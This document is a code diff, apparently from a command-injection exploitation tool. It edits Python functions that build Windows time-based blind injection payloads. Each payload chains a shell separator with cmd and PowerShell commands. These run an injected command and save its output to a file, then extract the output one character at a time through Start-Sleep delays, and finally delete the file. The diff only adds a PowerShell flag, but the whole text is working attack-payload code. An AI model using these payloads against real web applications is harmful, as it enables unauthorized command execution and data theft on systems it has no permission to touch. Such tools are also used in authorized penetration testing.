@@ -31,10 +31,10 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
       pipe = "|"
       payload = (pipe + " " +
                 "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + pipe + " "
-                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe "
+                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "((Get-Content " + OUTPUT_TEXTFILE + ").length-1)\"')"
                 " do if %i==" +str(j) + " "
-                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\") "
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay) + "\") "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
 
@@ -46,10 +46,10 @@ def decision(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
         ampersand = "&"
       payload = (ampersand + " " + 
                 "echo " + TAG + ">" + OUTPUT_TEXTFILE + " " + ampersand + " "
-                "for /f \"delims=\" %i in (' cmd /c \"powershell.exe "
+                "for /f \"delims=\" %i in (' cmd /c \"powershell.exe -InputFormat none "
                 "((Get-Content " + OUTPUT_TEXTFILE + ").length-1)\"')"
                 " do if %i==" +str(j) + " "
-                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\") "
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay) + "\") "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
 
@@ -203,13 +203,13 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
       pipe = "|"
       payload = (pipe + " " +
                 cmd + ">" + OUTPUT_TEXTFILE + " " + pipe + " "
-                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe "
+                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                 " do if %i==" +str(j) + " "
-                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay + 1) + " " +
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay + 1) + " " +
                 # Transform to ASCII
                 pipe + " "
-                "powershell.exe write-host ([int[]][char[]]([string](cmd /c " + cmd + "))) > " + OUTPUT_TEXTFILE + "\") "
+                "powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c " + cmd + "))) > " + OUTPUT_TEXTFILE + "\") "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
     if separator == "&&" :
@@ -220,13 +220,13 @@ def cmd_execution(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method
         ampersand = "&"
       payload = (ampersand + " " +
                 cmd + ">" + OUTPUT_TEXTFILE + " " + ampersand + " "
-                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe "
+                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "([string](Get-Content " + OUTPUT_TEXTFILE + ").length)\"')"
                 " do if %i==" +str(j) + " "
-                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay + 1) + " " +
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay + 1) + " " +
                 # Transform to ASCII
                 ampersand + " "
-                "powershell.exe write-host ([int[]][char[]]([string](cmd /c " + cmd + "))) > " + OUTPUT_TEXTFILE + "\") "
+                "powershell.exe -InputFormat none write-host ([int[]][char[]]([string](cmd /c " + cmd + "))) > " + OUTPUT_TEXTFILE + "\") "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
 
@@ -391,10 +391,10 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " " +
-                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe "
+                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" +str(num_of_chars-1)+ "]\"')"
                 " do if %i==" +str(ascii_char)+ " "
-                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay + 1) + "\")"
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay + 1) + "\")"
                 )
 
     if separator == "&&" :
@@ -404,10 +404,10 @@ def get_char(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_r
       else:
         ampersand = "&"
       payload = (ampersand + " " + 
-                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe "
+                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ").split(\" \")[" +str(num_of_chars-1)+ "]\"')"
                 " do if %i==" +str(ascii_char)+ " "
-                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay + 1) + "\")"
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay + 1) + "\")"
                 )
 
   else:
@@ -542,10 +542,10 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
-                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe "
+                "for /f \"delims=\" %i in ('cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                 "do if %i==" + str(ord(str(ascii_char))) + " "
-                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\") "
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay) + "\") "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
 
@@ -556,10 +556,10 @@ def fp_result(separator, OUTPUT_TEXTFILE, ascii_char, delay, http_request_method
       else:
         ampersand = "&"
       payload = (ampersand + " " 
-                "for /f \"delims=\" %i in (' cmd /c \"powershell.exe "
+                "for /f \"delims=\" %i in (' cmd /c \"powershell.exe -InputFormat none "
                 "(Get-Content " + OUTPUT_TEXTFILE + ")\"') "
                 "do if %i==" + str(ord(str(ascii_char))) + " "
-                "(cmd /c \"powershell.exe Start-Sleep -s " + str(delay) + "\") "
+                "(cmd /c \"powershell.exe -InputFormat none Start-Sleep -s " + str(delay) + "\") "
                 "else (cmd /c \"" + settings.WIN_DEL + OUTPUT_TEXTFILE + "\")"
                 )
 
